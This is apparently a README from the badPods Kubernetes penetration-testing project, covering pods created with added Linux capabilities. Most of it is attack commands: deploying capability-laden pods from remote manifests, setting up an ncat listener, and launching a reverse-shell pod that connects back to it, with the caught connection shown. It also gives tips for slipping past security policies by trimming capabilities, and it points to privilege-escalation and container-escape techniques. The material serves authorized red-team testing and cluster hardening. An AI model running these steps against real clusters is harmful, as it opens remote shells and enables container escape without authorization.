# Bad Pod #9: added capabilities

With added [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html), you can get special privileges and abuse them.

## Table of Contents
- [Bad Pod #9: added capabilities](#bad-pod-9-added-capabilities)
  - [Table of Contents](#table-of-contents)
- [Pod creation \& access](#pod-creation--access)
  - [Exec pods](#exec-pods)
  - [Reverse shell pods](#reverse-shell-pods)
  - [Deleting resources](#deleting-resources)
- [Post Exploitation](#post-exploitation)

# Pod creation & access

## Exec pods
Create one or more of these resource types and exec into the pod

**Pod**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/caps/pod/caps-exec-pod.yaml
kubectl exec -it caps-exec-pod -- bash
```
**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**

* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 

```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/caps/[RESOURCE_TYPE]/caps-exec-[RESOURCE_TYPE].yaml 
kubectl get pods | grep caps-exec-[RESOURCE_TYPE]      
kubectl exec -it caps-exec-[RESOURCE_TYPE]-[ID] -- bash
```

*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 

To troubleshoot a case where you don't see pods, use `kubectl describe`

```
kubectl describe caps-exec-[RESOURCE_TYPE]
```

***In case of creation failure, you can try to remove some capabilities from the `add` line in the yaml file, if catched by any security policy or module.*** *Some interesting capabilities: `CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, DAC_READ_SEARCH, DAC_OVERRIDE, CAP_SYS_RAWIO, CAP_SYSLOG, CAP_NET_RAW, CAP_NET_ADMIN`.*

## Reverse shell pods
Create one or more of these resources and catch the reverse shell

**Step 1: Set up listener**
```bash
ncat --ssl -vlp 3116
```

**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**

* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
* Replace the HOST and PORT values to point the reverse shell to your listener
* 
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/caps/[RESOURCE_TYPE]/caps-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
```

**Step 3: Catch the shell**
```bash
$ ncat --ssl -vlp 3116
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: Listening on :::3116
Ncat: Listening on 0.0.0.0:3116
Connection received on 10.0.0.162 42035
```

## Deleting resources
You can delete a resource using it's manifest, or by name. Here are some examples: 
```
kubectl delete [type] [resource-name]
kubectl delete -f manifests/caps/pod/caps-exec-pod.yaml
kubectl delete -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/caps/pod/caps-exec-pod.yaml
kubectl delete pod caps-exec-pod
kubectl delete cronjob caps-exec-cronjob
```


# Post Exploitation 

Post-exploitation possibilities depends on the added capabilities.

You can print the current capabilities with `cat /proc/$$/status | grep Cap`:

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set

I prefer not to quote existing techniques and I suggest you to use the [**Hacktricks guide about the exploitable Linux capabilities**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities) which is really good to reach privilege escalation or container escape.